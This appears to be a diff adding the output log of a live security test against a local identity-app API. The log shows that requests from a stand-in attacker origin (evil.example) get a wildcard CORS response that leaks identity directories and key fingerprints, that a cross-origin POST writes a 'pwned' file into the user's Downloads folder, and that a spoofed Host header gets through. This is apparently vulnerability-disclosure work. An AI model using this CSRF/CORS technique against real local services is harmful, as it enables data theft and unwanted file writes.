@@ -1,0 +1,42 @@
+=== F-GUI-01 LIVE TEST ===
+Date: Sun 19 Apr 2026 07:12:26 PM EDT
+
+--- /api/v1/context (Origin: https://evil.example) ---
+HTTP/1.1 200 OK
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-headers: content-type
+access-control-allow-methods: GET,POST,OPTIONS
+vary: Accept-Encoding
+content-length: 211
+date: Sun, 19 Apr 2026 23:12:26 GMT
+
+{"identityDir":"/home/william/.ebp","contactsDir":"/home/william/.ebp/contacts","currentIdentity":"williamdoyle.eth","server":"https://ebp-cqyo.onrender.com","protocolVersion":"0.0.1","componentVersion":"0.1.0"}
+--- /api/v1/identities (Origin: https://evil.example) ---
+HTTP/1.1 200 OK
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-headers: content-type
+access-control-allow-methods: GET,POST,OPTIONS
+vary: Accept-Encoding
+content-length: 464
+date: Sun, 19 Apr 2026 23:12:26 GMT
+
+{"identities":[{"name":"williamdoyle.eth","fingerprint":"ebpdk1dc0ue3a4jztw9rpxne7gjvddsxpzqgjl7yfekg2p5ajtu8uk3t8sqwsvz5","publishedToServer":true},{"name":"SPHINCS William","fingerprint":"ebpsk1t4q4k3xaq8ngrpzygvpdkslk6wzhsefnwz42m2xu6jsksphu8vksz6qgch","publishedToServer":true},{"name":"EBP Version Release Signer","fingerprint":"ebpdk1m6l96sg6xpwcspl5yn9zph8j82x7ujsuuwl5gwqhctgmndjtvvjq5vwp99","publishedToServer":true}],"currentIdentity":"williamdoyle.eth"}
+--- POST /api/v1/save-file (Origin: https://evil.example) ---
+HTTP/1.1 200 OK
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-headers: content-type
+access-control-allow-methods: GET,POST,OPTIONS
+vary: Accept-Encoding
+content-length: 56
+date: Sun, 19 Apr 2026 23:12:26 GMT
+
+{"path":"/home/william/Downloads/ebp-csrf-poc-live.txt"}
+--- Verify file landed in ~/Downloads/ ---
+-rw-rw-r-- 1 william william 28 Apr 19 19:12 /home/william/Downloads/ebp-csrf-poc-live.txt
+PoC: pwned by remote origin
+
+--- Host header bypass (Host: evil.example) ---
+{"identityDir":"/home/william/.ebp","contactsDir":"/home/william/.ebp/contacts","currentIdentity":"williamdoyle.eth","server":"https://ebp-cqyo.onrender.com","protocolVersion":"0.0.1","componentVersion":"0.1.0"}
